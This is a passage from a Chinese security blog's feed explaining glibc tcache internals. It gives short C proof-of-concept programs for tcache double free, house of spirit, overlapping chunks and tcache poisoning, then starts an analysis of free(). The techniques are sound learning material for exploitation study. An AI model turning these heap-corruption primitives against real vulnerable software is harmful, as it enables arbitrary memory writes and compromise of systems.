mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 